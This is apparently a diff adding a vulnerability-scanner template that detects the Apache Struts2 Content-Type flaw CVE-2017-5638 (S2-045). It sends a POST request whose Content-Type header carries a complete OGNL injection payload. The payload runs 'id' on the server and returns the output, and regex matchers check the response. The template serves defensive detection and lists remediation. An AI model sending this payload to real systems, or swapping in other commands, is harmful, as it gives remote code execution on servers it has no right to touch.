@@ -1,0 +1,40 @@
+id: apache-struts-s2-045
+info:
+  name: Apache Struts2 Content-Type RCE (CVE-2017-5638 / S2-045)
+  severity: critical
+  tags: [cves-rce-critical, struts, apache, rce, ognl, cve-2017-5638]
+  description: "Detects CVE-2017-5638 in Apache Struts 2. A malicious Content-Type header with an OGNL expression causes RCE during multipart request parsing. Used in the Equifax breach."
+  remediation: "Upgrade Apache Struts to 2.3.32 or 2.5.10.1 or later. Apply the Jakarta Multipart parser patch. Implement a WAF rule to block malformed Content-Type headers."
+  cwe: "CWE-20"
+  owasp: "A03:2021-Injection"
+
+requests:
+  - method: POST
+    paths:
+      - /struts2-showcase/
+      - /struts2-showcase/index.action
+      - /struts2-rest-showcase/
+      - /struts2-rest-showcase/orders
+      - /index.action
+      - /login.action
+      - /upload.action
+    headers:
+      Content-Type: "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+    stop-at-first-match: false
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+.*gid=\\d+"
+          - "root:x:0:0"
+          - "www-data"
+        part: body
+        condition: or
+      - type: word
+        words:
+          - "apache struts"
+          - "There is no Action mapped"
+          - "Struts Problem Report"
+        part: body
+        condition: or
